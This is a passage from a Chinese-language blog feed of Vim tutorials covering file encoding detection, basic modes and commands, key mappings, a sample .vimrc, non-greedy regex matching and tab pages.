<li>termencoding<br>Vim所工作的终端(或者Windows的Console窗口)的字符编码方式。如果vim所在的term与vim编码相同，则无需设置。如其不然，你可以用vim的termencoding选项将自动转换成term的编码.这个选项对GUI模式Vim(GVim)无效，而对Console模式的Vim而言就是Windows控制台的代码页，并且通常我们不需要改变它。</li>
</ul>
<p>现在来看看Vim的多字符编码方式支持是如何工作的：</p>
<ol>
<li>启动Vim，根据.vimrc文件中设置的encoding的值来设置buffer、菜单文本、消息文的字符编码方式。</li>
<li>读取需要编辑的文件，根据fileencodings中列出的字符编码方式逐一探测该文件编码方式。并设置fileencoding为探测到的，看起来是正确的字符编码方式。</li>
<li>对比fileencoding和encoding的值，若不同则调用iconv将文件内容转换为encoding所描述的字符编码方式，并且把转换后的内容放到为此文件开辟的buffer里，此时我们就可以开始编辑这个文件了。注意，完成这一步动作需要调用外部的iconv.dll，你需要保证这个文件存在于$VIMRUNTIME或者其他列在PATH环境变量中的目录里。</li>
<li>编辑完成后保存文件时，再次对比fileencoding和encoding的值。若不同，再次调用iconv将即将保存的buffer中的文本转换为fileencoding所描述的字符编码方式，并保存到指定的文件中。同样，这需要调用iconv.dll由于Unicode能够包含几乎所有的语言的字符，而且Unicode的UTF-8编码方式又是非常具有性价比的编码方式(空间消耗比 UCS-2小)，因此建议encoding的值设置为utf-8。这么做的另一个理由是encoding设置为utf-8 时，Vim 自动探测文件的编码方式会更准确 (或许这个理由才是主要的;)。我们在中文Windows里编辑的文件，为了兼顾与其他软件的兼容性，文件编码还是设置为GB2312&#x2F;GBK比较合适，因此fileencoding建议设置为chinese(chinese是个别名，在Unix里表示gb2312，在Windows里表示cp936，也就是GBK的代码页)。</li>
</ol>
<p>当vim在utf-8的local下打开gbk文件时，显示的是乱码，可以在~&#x2F;.vimrc文件中加入如下代码来解决：</p>
<pre><code>set fencs=utf-8,gbk
</code></pre>
<p>这一行的作用是告诉vim，打开一个文件时，尝试utf8,gbk两种编码，vim只需要扫描文件的前一段，就可以根据文件里面的数据判断出文件是否用的是utf8或者gbk编码。如果不指定这一行，则vim只会用当前编码(locale)来打开文件，因为locale是UTF-8，而文件是gbk，所以打开是乱码。</p>
<p>一般vim打开中文文件时出现乱码时可以用下面的方法来解决：</p>
<pre><code>set fileencoding=gb18030 
set fileencodings=utf-8,gb18030,utf-16,big5
</code></pre>
<p>这样设置的原因说明如下：vim里面的编码主要跟三个参数有关：enc(encoding),fenc(fileencoding)和fencs(fileencodings)。其中fenc是当前文件的编码，也就是说，一个在vim里面已经正确显示了的文件(前提是你的系统环境跟你的enc设置匹配)，你可以通过改变fenc后再w来将此文件存成不同的编码。比如说，我:set fenc&#x3D;utf-8然后:w就把文件存成utf-8的了，:set fenc&#x3D;gb18030再:w就把文件存成gb18030的了。这个值对于打开文件的时候是否能够正确地解码没有任何关系。fencs就是用来在打开文件的时候进行解码的猜测列表。文件编码没有百分百正确的判断方法，所以vim只能猜测文件编码。比如我的vimrc里面这个的设置是：</p>
<pre><code>set fileencodings=utf-8,gb18030,utf-16,big5
</code></pre>
<p>所以我的vim每打开一个文件，先尝试用utf-8进行解码，如果用utf-8解码到了一半出错(所谓出错的意思是某个地方无法用utf-8正确地解码)，那么就从头来用gb18030重新尝试解码，如果gb18030又出错(注意gb18030并不是像utf-8似的规则编码，所以所谓的出错只是说某个编码没有对应的有意义的字，比如0)，就尝试用utf-16，仍然出错就尝试用big5。这一趟下来，如果中间的某次解码从头到尾都没有出错，那么vim就认为这个文件是这个编码的，不会再进行后面的尝试了。这个时候，fenc的值就会被设为vim最后采用的编码值，可以用:set fenc来查看具体是什么。</p>
<p>当然这个也是有可能出错的，比如你的文件是gb18030编码的，但是实际上只有一两个字符是中文，那么有可能他们正好也能被utf-8解码，那么这个文件就会被误认为是utf-8的导致错误解码。</p>
<p>至于enc，其作用基本只是显示。不管最后的文件是什么编码的，vim都会将其转换为当前系统编码来进行处理，这样才能在当前系统里面正确地显示出来，因此enc就是干这个的。在windows下面，enc默认是cp936，这也就是中文windows的默认编码，所以enc是不需要改的。在linux下，随着你的系统locale可能设为zh_CN.gb18030或者zh_CN.utf-8，你的enc要对应的设为gb18030或者utf-8(或者gbk之类的)。</p>
<p>最后再来说一下新建空文件的默认编码。看文档好像说会采用fencs里面的第一个编码作为新建文件的默认编码。但是这里有一个问题，就是fencs的顺序跟解码成功率有很大关系，根据我的经验utf-8在前比gb18030在前成功率要高一些，那么如果我新建文件默认想让它是gb18030编码怎么办？一个方法是每次新建文件后都:set fenc&#x3D;gb18030一下，不过我发现在vimrc里面设置fenc&#x3D;gb18030也能达到这个效果。</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>VIM</category>
      </categories>
      <tags>
        <tag>VIM</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim快速入门</title>
    <url>/blog/tools/vim/vimksrm/</url>
    <content><![CDATA[<p>Vim的基本功能学习还是很容易的，主要掌握Vim的模式和几个快捷键就行了。分分钟的事，没有多难。</p>
<h2 id="Vim模式"><a href="#Vim模式" class="headerlink" title="Vim模式"></a>Vim模式</h2><ul>
<li>正常模式:浏览和修改文本内容</li>
<li>命令模式:多用于操作文本文件,而不是操作文本文件的内容</li>
<li>插入模式:向文本中添加内容</li>
<li>可视模式:选取文本</li>
</ul>
<h2 id="正常模式"><a href="#正常模式" class="headerlink" title="正常模式"></a>正常模式</h2><p>在任何时候按Esc键都会退到正常模式。</p>
<p>记住移动光标的四个快捷键：</p>
<pre><code>k                上移；
j                下移；
h                左移；
l                右移。
</code></pre>
<p>记住删除快捷键：</p>
<p>d：删除行</p>
<p>x:删除字符</p>
<p>不多吧，一共6个。</p>
<h2 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h2><p>在编辑模式下键入 :<br>，光标就跳到屏幕最后一行，并在那里显示冒号，此时已进入命令模式。命令模式又称<br>末行模式 ，用户输入的内容均显示在屏幕的最后一行，按回车键，Vim<br>执行命令。</p>
<p>打开文件需要用 <strong><code>:e</code></strong> 命令：</p>
<pre><code>:e path_to_file/filename
</code></pre>
<p>保存文件需要用 <strong><code>:w</code></strong> 命令（单词 <code>write</code> 的缩写）：</p>
<pre><code>:w
</code></pre>
<p>将当前文件另存为 <code>file_temp</code> 则：</p>
<pre><code>:w file_temp
</code></pre>
<p>退出编辑程序，而不打算保存编辑的内容，可用下面的命令：</p>
<pre><code>: q                在未作修改的情况下退出；
: q!               放弃所有修改，退出编辑程序。
</code></pre>
<p>保存并退出则可以讲两条命令结合起来使用（注意命令顺序，先保存，后退出）：</p>
<pre><code>:wq
</code></pre>
<p>不多，就ewq三个而已。</p>
<h2 id="插入模式"><a href="#插入模式" class="headerlink" title="插入模式"></a>插入模式</h2><p>在编辑模式下正确定位光标之后，可用以下命令切换到插入模式：</p>
<pre><code>i            在光标左侧插入正文
I            在光标所在行的开头插入
a            在光标右侧插入正文
A            在光标所在行的末尾插入
o            在光标所在行的下一行增添新行
O            在光标所在行的上一行增添新行
</code></pre>
<p>只有大小写的iao而已。</p>
<h2 id="可视模式"><a href="#可视模式" class="headerlink" title="可视模式"></a>可视模式</h2><p>为了便于选取文本，VIM 引入了可视(Visual)模式。</p>
<p>在正常模式下按v键进入可视模式。</p>
<p>按正常模式的方式移动光标，光标移动过的区域会被选中。</p>
<p>删除或复制:</p>
<pre><code>x或d     剪切(即删除，同时所选的文本进入剪贴板) 
y        复制
</code></pre>
<p>当输入了命令以后，VIM 将回到普通模式，这时可以按 p 或 P 进行粘贴。</p>
<pre><code>p   粘在光标所在字符后面
P    粘在前面
</code></pre>
]]></content>
      <categories>
        <category>工具</category>
        <category>VIM</category>
      </categories>
      <tags>
        <tag>VIM</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim按键映射(Map)详解</title>
    <url>/blog/tools/vim/vimmap/</url>
    <content><![CDATA[<h2 id="Map简介"><a href="#Map简介" class="headerlink" title="Map简介"></a>Map简介</h2><p>Map是Vim强大的一个重要原因，可以自定义各种快捷键。</p>
<p>不只是将键映射，还可以将键映射到一组操作上，这种功能类似宏功能。</p>
<p>所以要想用好VIM还要把众多基本功能都有了解，才能组合出自己需要的快捷键。</p>
<p>使用以下命令，可以在Normal Mode和Visual&#x2F;Select Mode下，利用Tab键和Shift-Tab键来缩进文本：</p>
<pre><code>nmap  V&gt;
nmap  V&lt;
vmap  &gt;gv
vmap  
</code></pre>
<p>使用以下命令，指定F10键来新建标签页：</p>
<pre><code>:map  :tabnew
</code></pre>
<p>简而言之，map把快捷键映射为了指定的操作。</p>
<h2 id="命令的组合"><a href="#命令的组合" class="headerlink" title="命令的组合"></a>命令的组合</h2><p>同Vim下的其他命令一样，命令的名字往往由好几段组成。前缀作为命令本身的修饰符，微调命令的效果。</p>
<ul>
<li>nore:表示非递归，见下面的介绍</li>
<li>n:表示在普通模式下生效</li>
<li>v:表示在可视模式下生效</li>
<li>i:表示在插入模式下生效</li>
<li>c:表示在命令行模式下生效</li>
</ul>
<h2 id="递归Recursive-Mapping"><a href="#递归Recursive-Mapping" class="headerlink" title="递归Recursive Mapping"></a>递归Recursive Mapping</h2><p>递归的映射。其实很好理解，也就是如果键a被映射成了b，c又被映射成了a，如果映射是递归的，那么c就被映射成了b。</p>
<p>:map a b :map c a</p>
<p>对于c效果等同于</p>
<p>:map c b</p>
<p>默认的map就是递归的。如果遇到[nore]这种前缀，比如:noremap，就表示这种map是非递归的。</p>
<h2 id="常用map命令"><a href="#常用map命令" class="headerlink" title="常用map命令"></a>常用map命令</h2><p>这里列出常用的一些map命令，默认map命令影响到普通模式和可视模式。</p>
<ul>
<li>:map :noremap :unmap :mapclear</li>
<li>:nmap :nnoremap :nunmap :nmapclear</li>
<li>:vmap :vnoremap :vunmap :vmapclear</li>
<li>:imap :inoremap :iunmap :imapclear</li>
<li>:cmap :cnoremap :cunmap :cmapclear</li>
</ul>
<h2 id="不同map命令和模式的关系"><a href="#不同map命令和模式的关系" class="headerlink" title="不同map命令和模式的关系"></a>不同map命令和模式的关系</h2><table>
<thead>
<tr>
<th>命令</th>
<th>常规模式</th>
<th>可视化模式</th>
<th>运算符模式</th>
<th>插入模式</th>
<th>命令行模式</th>
</tr>
</thead>
<tbody><tr>
<td><code>:map</code>{.inset}</td>
<td>y</td>
<td>y</td>
<td>y</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>:nmap</code>{.inset}</td>
<td>y</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>:vmap</code>{.inset}</td>
<td></td>
<td>y</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>:omap</code>{.inset}</td>
<td></td>
<td></td>
<td>y</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>:map!</code>{.inset}</td>
<td></td>
<td></td>
<td></td>
<td>y</td>
<td>y</td>
</tr>
<tr>
<td><code>:imap</code>{.inset}</td>
<td></td>
<td></td>
<td></td>
<td>y</td>
<td></td>
</tr>
<tr>
<td><code>:cmap</code>{.inset}</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>y</td>
</tr>
</tbody></table>
<h2 id="其它键"><a href="#其它键" class="headerlink" title="其它键"></a>其它键</h2><p>unmap</p>
<p>unmap后面跟着一个按键组合，表示删除这个映射。</p>
<p>:unmap c</p>
<p>那么在map生效模式下，c不再被映射到a上。</p>
<p>同样，unmap可以加各种前缀，表示影响到的模式。</p>
<p>mapclear</p>
<p>mapclear直接清除相关模式下的所有映射。</p>
<p>同样，mapclear可以加各种前缀，表示影响到的模式。</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>VIM</category>
      </categories>
      <tags>
        <tag>VIM</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim开发常用配制</title>
    <url>/blog/tools/vim/vimrccypz/</url>
    <content><![CDATA[<p>在终端下使用vim进行编辑时，默认情况下，编辑的界面上是没有显示行号、语法高亮度显示、智能缩进等功能的。为了更好的在vim下进行工作，需要手动设置一个配置文件：.vimrc。</p>
<p>在启动vim时，当前用户根目录下的.vimrc文件会被自动读取，该文件可以包含一些设置甚至脚本。</p>
<pre><code>&quot;双引号开始的行为注释行，下同
&quot;去掉讨厌的有关vi一致性模式，避免以前版本的一些bug和局限
set nocompatible
&quot;显示行号
set number
&quot;检测文件的类型
filetype on 
&quot;记录历史的行数
set history=1000 
&quot;背景使用夜晚模式 //你会很爽的
color evening
&quot;语法高亮度显示
syntax on 
&quot;下面两行在进行编写代码时，在格式对起上很有用；
&quot;第一行，vim使用自动对起，也就是把当前行的对起格式应用到下一行；
&quot;第二行，依据上面的对起格式，智能的选择对起方式，对于类似C语言编
&quot;写上很有用
set autoindent
set smartindent
&quot;第一行设置tab键为4个空格，第二行设置当行之间交错时使用4个空格
set tabstop=4
set shiftwidth=4
&quot;设置匹配模式，类似当输入一个左括号时会匹配相应的那个右括号
set showmatch
&quot;去除vim的GUI版本中的toolbar
set guioptions=T
&quot;当vim进行编辑时，如果命令错误，会发出一个响声，该设置去掉响声
set vb t_vb=
&quot;在编辑过程中，在右下角显示光标位置的状态行
set ruler
&quot;默认情况下，寻找匹配是高亮度显示的，该设置关闭高亮显示
set nohls
&quot;查询时非常方便，如要查找book单词，当输入到/b时，会自动找到第一
&quot;个b开头的单词，当输入到/bo时，会自动找到第一个bo开头的单词，依
&quot;次类推，进行查找时，使用此设置会快速找到答案，当你找要匹配的单词
&quot;时，别忘记回车
set incsearch
&quot;修改一个文件后，自动进行备份，备份的文件名为原文件名加&quot;~&quot;后缀
if has(&quot;vms&quot;) 
set nobackup
else
set backup
endif
</code></pre>
<p>效果图：</p>
<p><img src="/images/vim/vimxgt.jpg"></p>
]]></content>
      <categories>
        <category>工具</category>
        <category>VIM</category>
      </categories>
      <tags>
        <tag>VIM</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim正规表达式最短匹配</title>
    <url>/blog/tools/vim/vimregzdpp/</url>
    <content><![CDATA[<pre><code>&lt;pre class=&quot;hljs matlab&quot;&gt;&lt;code class=&quot;matlab&quot;&gt;k                上移；
&lt;span class=&quot;hljs-built_in&quot;&gt;j&lt;/span&gt;                下移；
h                左移；
l                右移。&lt;/code&gt;&lt;/pre&gt;
</code></pre>
<p>如果用vim删除上面所有class属性，用如下命令会出问题：</p>
<pre><code>:1,$ s/class=&quot;.\+&quot;//g
</code></pre>
<p>原因是+加的匹配默认是最长匹配，也就是能匹配多长就多长，也以匹配结果为：</p>
<pre><code>class=&quot;hljs matlab&quot;&gt;&lt;code class=&quot;matlab&quot;
</code></pre>
<p>但我们想要的是：</p>
<pre><code>class=&quot;hljs matlab&quot;

class=&quot;matlab&quot;
</code></pre>
<p>这就是正规表达式的最短匹配问题，所有用到正则表达式的地方都有处理这个问题的专用方法，很不幸的是大多不一样。</p>
<p>vim的最短匹配方法是把\+改为\{-}。</p>
<p>上面的替换这样用就正常了：</p>
<pre><code>:1,$ s/class=&quot;.\&#123;-&#125;&quot;//g
</code></pre>
]]></content>
      <categories>
        <category>工具</category>
        <category>VIM</category>
      </categories>
      <tags>
        <tag>VIM</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim标签页（tab）的使用</title>
    <url>/blog/tools/vim/vimtab/</url>
    <content><![CDATA[<p><strong>打开文件在新标签页</strong></p>
<p>:tabe filename</p>
<p>:tabnew filename</p>
<p>:tab split 在新标签页，打开当前缓冲区中的文件</p>
<p><strong>显示</strong></p>
<p>:tabs<br>显示已打开标签页的列表,并用“&gt;”标识出当前页面，用“+”标识出已更改的页面(即还未保存）。</p>
<p><strong>关闭</strong></p>
<p>:tabc 关闭当前标签页</p>
<p>:tabo 关闭自己之外所有标签页(other)</p>
<p><strong>切换标签页</strong></p>
<p>:tabn 或 gt 移动到下一个标签页</p>
<p>:tabp 或 gT 移动到上一个标签页</p>
<p>:tabfirst 或 :tabr 移动到第一个标签页</p>
<p>:tablast 移动到最后一个标签页</p>
<p><strong>移动标签页</strong></p>
<p>:tabm number</p>
<p>请注意，标签页次序是从0开始计数的。比如命令:tabm<br>1将把当前标签页移动到第2的位置。如果你没有为:tabm命令指定参数，那么当前标签页将会被移动到最后。</p>
<p><strong>多标签命令</strong></p>
<p>:tabdo 命令 可以同时在多个标签页中执行命令</p>
<p><strong>配置标签</strong>页</p>
<p>vimrc中设置</p>
<p>set showtabline&#x3D;0 始终不显示标签页</p>
<p>set showtabline&#x3D;0 始终不显示标签页</p>
<p>set showtabline&#x3D;2 总是显示标签栏</p>
<p>Vim默认最多只能打开10个标签页，你可以用set tabpagemax&#x3D;15改变这个限制。</p>
<p><strong>帮助</strong></p>
<p>:help tab-page-intro</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>VIM</category>
      </categories>
      <tags>
        <tag>VIM</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim入门基础</title>
    <url>/blog/tools/vim/vimrm/</url>
    <content><![CDATA[<ol>
<li>简介</li>
</ol>
<hr>
<p>Vim（Vi[Improved]）编辑器是功能强大的跨平台文本文件编辑工具，继承自Unix系统的Vi编辑器，支持Linux&#x2F;Mac OSX&#x2F;Windows系统，利用它可以建立、修改文本文件。进入Vim编辑程序，可以在终端输入下面的命令：</p>
<pre><code>$vim [filename]
</code></pre>
<p>其中<code>filename</code>是要编辑器的文件的路径名。如果文件不存在，它将为你建立一个新文件。Vim编辑程序有三种操作模式，分别称为<strong>编辑模式</strong>、<strong>插入模式</strong> 和<strong>命令模式</strong>，当运行Vim时，首先进入编辑模式。</p>
<ol start="2">
<li>编辑模式</li>
</ol>
<hr>
<p>Vim编辑方式的主要用途是在被编辑的文件中移动光标的位置。一旦光标移到到所要的位置，就可以进行剪切和粘贴正文块，删除正文和插入新的正文。当完成所有的编辑工作后，需要保存编辑器结果，退出编辑程序回到终端，可以发出<code>ZZ</code>命令，连续按两次大写的<code>Z</code>键。</p>
<h3 id="2-1-跳转"><a href="#2-1-跳转" class="headerlink" title="2.1 跳转"></a>2.1 跳转</h3><p>如果键盘上有上、下、左、右箭头的导航键，就由这些键来完成光标的移动。另外，可以用下面的键完成同样的<br><strong>按字符移动</strong> 功能：</p>
<pre><code>k                上移；
j                下移；
h                左移；
l                右移。
</code></pre>
<p>上面这４个键将光标位置每次移动一行或一个 <strong>字符</strong>。Vim还提供稍大范围移动光标的命令：</p>
<pre><code>ctrl+f        在文件中前移一页（相当于 page down）；
ctrl+b        在文件中后移一页（相当于 page up）；
</code></pre>
<p>更大范围的移动：</p>
<pre><code>*          当光标停留在一个单词上，* 键会在文件内搜索该单词，并跳转到下一处；
#          当光标停留在一个单词上，# 在文件内搜索该单词，并跳转到上一处；
(/)        移动到 前/后 句 的开始；
&#123;/&#125;        跳转到 当前/下一个 段落 的开始。
g_         到本行最后一个不是 blank 字符的位置。
fa         到下一个为 a 的字符处，你也可以fs到下一个为s的字符。
t,         到逗号前的第一个字符。逗号可以变成其它字符。
3fa        在当前行查找第三个出现的 a。
F/T        和 f 和 t 一样，只不过是相反方向;
gg         将光标定位到文件第一行起始位置；
G          将光标定位到文件最后一行起始位置；
NG或Ngg    将光标定位到第 N 行的起始位置。
</code></pre>
<p>在屏幕中找到需要的 <strong>一页</strong> 时，可以用下面的命令快速移动光标：</p>
<pre><code>H                将光标移到屏幕上的起始行（或最上行）；
M                将光标移到屏幕中间；
L                将光标移到屏幕最后一行。
</code></pre>
<p>同样需要注意字母的大小写。<code>H</code> 和 <code>L</code> 命令还可以加数字。如 <code>2H</code>表示将光标移到屏幕的第２行，<code>3L</code> 表示将光标移到屏幕的倒数第3行。当将光标移到所要的行是，<strong>行内移动</strong> 光标可以用下面的命令来实现：</p>
<pre><code>w                右移光标到下一个字的开头；
e                右移光标到一个字的末尾；
b                左移光标到前一个字的开头；
0                数字０，左移光标到本行的开始；
$                右移光标，到本行的末尾；
^                移动光标，到本行的第一个非空字符。
</code></pre>
<h3 id="2-2-搜索匹配"><a href="#2-2-搜索匹配" class="headerlink" title="2.2 搜索匹配"></a>2.2 搜索匹配</h3><p>和许多先进的编辑器一样，Vim提供了强大的字符串搜索功能。要查找文件中指定字或短语出现的位置，可以用Vim直接进行搜索，而不必以手工方式进行。搜索方法是：键入字符<code>/</code>，后面跟以要搜索的字符串，然后按回车键。编辑程序执行正向搜索（即朝文件末尾方向），并在找到指定字符串后，将光标停到该字符串的开头；键入<code>n</code> 命令可以继续执行搜索，找出这一字符串下次出现的位置。用字符 <code>?</code> 取代<code>/</code> ，可以实现反向搜索（朝文件开头方向）。例如：</p>
<pre><code>/str1                正向搜索字符串 str1；
n                    继续搜索，找出 str1 字符串下次出现的位置；
N                    继续搜索，找出 str1 字符串上一次出现的位置；
?str2                反向搜索字符串 str2 。
</code></pre>
<p>无论搜索方向如何，当到达文件末尾或开头时，搜索工作会循环到文件的另一端并继续执行。</p>
<p>Vim中执行搜索匹配最强大的地方是结合 <strong>正则表达式</strong>来搜索，后续将会介绍。</p>
<h3 id="2-3-替换和删除"><a href="#2-3-替换和删除" class="headerlink" title="2.3 替换和删除"></a>2.3 替换和删除</h3><p>Vim常规的删除命令是 <code>d</code>、 <code>x</code> (前者删除 <code>行</code> ，后者删除 <code>字符</code>),结合Vim的其他特性可以实现基础的删除功能。将光标定位于文件内指定位置后，可以用其他字符来替换光标所指向的字符，或从当前光标位置删除一个或多个字符或一行、多行。例如：</p>
<pre><code>rc                 用 c 替换光标所指向的当前字符；
nrc                用 c 替换光标所指向的前 n 个字符；
5rA                用 A 替换光标所指向的前 5 个字符；
x                  删除光标所指向的当前字符；
nx                 删除光标所指向的前 n 个字符；
3x                 删除光标所指向的前 3 个字符；
dw                 删除光标右侧的字；
ndw                删除光标右侧的 n 个字；
3dw                删除光标右侧的 3 个字；
db                 删除光标左侧的字；
ndb                删除光标左侧的 n 个字；
5db                删除光标左侧的 5 个字；
dd                 删除光标所在行，并去除空隙；
ndd                删除（剪切） n 行内容，并去除空隙；
3dd                删除（剪切） 3 行内容，并去除空隙；
</code></pre>
<p>其他常用的删除命令有：</p>
<pre><code>d$                从当前光标起删除字符直到行的结束；
d0                从当前光标起删除字符直到行的开始；
J                 删除本行的回车符（CR），并和下一行合并。
</code></pre>
<p>Vim常规的替换命令有 <code>c</code> 和 <code>s</code>，结合Vim的其他特性可以实现基础的替换功能，不过替换命令执行以后，通常会由<strong>编辑模式</strong> 进入 <strong>插入模式</strong> ：</p>
<pre><code>s                用输入的正文替换光标所指向的字符；
S                删除当前行，并进入编辑模式；
ns               用输入的正文替换光标右侧 n 个字符；
nS               删除当前行在内的 n 行，并进入编辑模式；
cw               用输入的正文替换光标右侧的字；
cW               用输入的正文替换从光标到行尾的所有字符（同 c$ )；
ncw              用输入的正文替换光标右侧的 n 个字；
cb               用输入的正文替换光标左侧的字；
ncb              用输入的正文替换光标左侧的 n 个字；
cd               用输入的正文替换光标的所在行；
ncd              用输入的正文替换光标下面的 n 行；
c$               用输入的正文替换从光标开始到本行末尾的所有字符；
c0               用输入的正文替换从本行开头到光标的所有字符。
</code></pre>
<h3 id="2-4-复制粘贴"><a href="#2-4-复制粘贴" class="headerlink" title="2.4 复制粘贴"></a>2.4 复制粘贴</h3><p>从正文中删除的内容（如字符、字或行）并没有真正丢失，而是被剪切并复制到了一个内存缓冲区中。用户可将其粘贴到正文中的指定位置。完成这一操作的命令是：</p>
<pre><code>p               小写字母 p，将缓冲区的内容粘贴到光标的后面；
P               大写字母 P，将缓冲区的内容粘贴到光标的前面。
</code></pre>
<p>如果缓冲区的内容是字符或字，直接粘贴在光标的前面或后面；如果缓冲区的内容为整行正文，执行上述粘贴命令将会粘贴在当前光标所在行的上一行或下一行。</p>
<p>注意上述两个命令中字母的大小写。Vim 编辑器经常以一对大、小写字母（如 <code>p</code>和<code>P</code>）来提供一对相似的功能。通常，小写命令在光标的后面进行操作，大写命令在光标的前面进行操作。</p>
<p>有时需要复制一段正文到新位置，同时保留原有位置的内容。这种情况下，首先应当把指定内容复制（而不是剪切）到内存缓冲区。完成这一操作的命令是：</p>
<pre><code>yy              复制当前行到内存缓冲区；
nyy             复制 n 行内容到内存缓冲区；
5yy             复制 5 行内容到内存缓冲区；
“+y             复制 1 行到操作系统的粘贴板；
“+nyy           复制 n 行到操作系统的粘贴板。
</code></pre>
<h3 id="2-5-撤销和重复"><a href="#2-5-撤销和重复" class="headerlink" title="2.5 撤销和重复"></a>2.5 撤销和重复</h3><p>在编辑文档的过程中，为消除某个错误的编辑命令造成的后果，可以用撤消命令。另外，如果用户希望在新的光标位置重复前面执行过的编辑命令，可用重复命令。</p>
<pre><code>u               撤消前一条命令的结果；
.               重复最后一条修改正文的命令。
</code></pre>
<ol start="3">
<li>插入模式</li>
</ol>
<hr>
<h3 id="3-1-进入插入模式"><a href="#3-1-进入插入模式" class="headerlink" title="3.1 进入插入模式"></a>3.1 进入插入模式</h3><p>在编辑模式下正确定位光标之后，可用以下命令切换到插入模式：</p>
<pre><code>i            在光标左侧插入正文
a            在光标右侧插入正文
o            在光标所在行的下一行增添新行
O            在光标所在行的上一行增添新行
I            在光标所在行的开头插入
A            在光标所在行的末尾插入
</code></pre>
<h3 id="3-2-退出插入模式"><a href="#3-2-退出插入模式" class="headerlink" title="3.2 退出插入模式"></a>3.2 退出插入模式</h3><p>退出插入模式的方法是，按 <code>ESC</code> 键或组合键 <code>Ctrl+[</code>，退出插入模式之后，将会进入编辑模式 。</p>
<ol start="4">
<li>命令模式</li>
</ol>
<hr>
<p>在Vim的命令模式下，可以使用复杂的命令。在编辑模式下键入 <code>:</code>，光标就跳到屏幕最后一行，并在那里显示冒号，此时已进入命令模式。命令模式又称<strong>末行模式</strong> ，用户输入的内容均显示在屏幕的最后一行，按回车键，Vim执行命令。</p>
<h3 id="4-1-打开、保存、退出"><a href="#4-1-打开、保存、退出" class="headerlink" title="4.1 打开、保存、退出"></a>4.1 打开、保存、退出</h3><p>在已经启动的Vim中打开一个文件需要用 <strong><code>:e</code></strong> 命令：</p>
<pre><code>:e path_to_file/filename
</code></pre>
<p>保存当前编辑的文件需要用 <strong><code>:w</code></strong> 命令（单词 <code>write</code> 的缩写）：</p>
<pre><code>:w
</code></pre>
<p>将当前文件另存为 <code>file_temp</code> 则：</p>
<pre><code>:w file_temp
</code></pre>
<p>在编辑模式下可以用 <code>ZZ</code>命令退出Vim编辑程序，该命令保存对正文所作的修改，覆盖原始文件。如果只需要退出编辑程序，而不打算保存编辑的内容，可用下面的命令：</p>
<pre><code>: q                在未作修改的情况下退出；
: q!               放弃所有修改，退出编辑程序。
</code></pre>
<p>保存并退出则可以讲两条命令结合起来使用（注意命令顺序，先保存，后退出）：</p>
<pre><code>:wq
</code></pre>
<h3 id="4-2-行号与文件"><a href="#4-2-行号与文件" class="headerlink" title="4.2 行号与文件"></a>4.2 行号与文件</h3><p>编辑中的每一行正文都有自己的行号，用下列命令可以移动光标到指定行（效果与<strong>编辑模式</strong> 下的 <code>ngg</code> 或 <code>nG</code> 相同）：</p>
<pre><code>: n             将光标移到第 n 行
</code></pre>
<p>命令模式下，可以规定命令操作的行号范围。数值用来指定绝对行号；字符“.”表示光标所在行的行号；字符符“$”表示正文最后一行的行号；简单的表达式，例如“.+5”表示当前行往下的第<br>5 行。例如：</p>
<pre><code>:345                  将光标移到第 345 行
:345w file            将第 345 行写入 file 文件
:3,5w file            将第 3 行至第 5 行写入 file 文件
:1,.w file            将第 1 行至当前行写入 file 文件
:.,$w file            将当前行至最后一行写入 file 文件
:.,.+5w file          从当前行开始将 6 行内容写入 file 文件
:1,$w file            将所有内容写入 file 文件，相当于 :w file 命令
</code></pre>
<p>在命令模式下，允许从文件中读取正文，或将正文写入文件。例如：</p>
<pre><code>:w                 将编辑的内容写入原始文件，用来保存编辑的中间结果
:wq                将编辑的内容写入原始文件并退出编辑程序（相当于 ZZ 命令）
:w file            将编辑的内容写入 file 文件，保持原有文件的内容不变
:a,bw file         将第 a 行至第 b 行的内容写入 file 文件
:r file            读取 file 文件的内容，插入当前光标所在行的后面
:e file            编辑新文件 file 代替原有内容
:f file            将当前文件重命名为 file
:f                 打印当前文件名称和状态，如文件的行数、光标所在的行号等
</code></pre>
<h3 id="4-3-字符串搜索"><a href="#4-3-字符串搜索" class="headerlink" title="4.3 字符串搜索"></a>4.3 字符串搜索</h3><p>在 <strong>编辑模式</strong> 讲过字符串的搜索，此处的 <strong>命令模式</strong>也可以进行字符串搜索，给出一个字符串，可以通过搜索该字符串到达指定行。如果希望进行正向搜索，将待搜索的字符串置于两个<code>/</code> 之间；如果希望反向搜索，则将字符串放在两个 <code>?</code> 之间。例如：</p>
<pre><code>:/str/                  正向搜索，将光标移到下一个包含字符串 str 的行
:?str?                  反向搜索，将光标移到上一个包含字符串 str 的行
:/str/w file            正向搜索，并将第一个包含字符串 str 的行写入 file 文件
:/str1/,/str2/w file    正向搜索，并将包含字符串 str1 的行至包含字符串 str2 的行写
</code></pre>
<h3 id="4-4-Vim中的正则表达式"><a href="#4-4-Vim中的正则表达式" class="headerlink" title="4.4 Vim中的正则表达式"></a>4.4 Vim中的正则表达式</h3><p>当给Vim指定搜索字符串时，可以包含具有特殊含义的字符。包含这些特殊字符的搜索字符串称为正则表达式（Regular Expressions）。例如，要搜索一行正文，这行正文的开头包含 <code>struct</code>字。下面的命令做不到这一点：</p>
<pre><code>:/struct/
</code></pre>
<p>因为它只找出在行中任意位置包含 <code>struct</code>的第一行，并不一定在行的开始包含<code>struct</code> 。解决问题的办法是在搜索字符串前面加上特殊字符^：</p>
<pre><code>:/^struct/
</code></pre>
<p><code>^</code> 字符比较每行开头的字符串。所以上面的命令表示：找出以字符串 <code>struct</code>开头的行。也可以用类似办法在搜索字符串后面加上表示行的末尾的特殊字符 <code>$</code>来找出位于行末尾的字：</p>
<pre><code>:/^struct/
</code></pre>
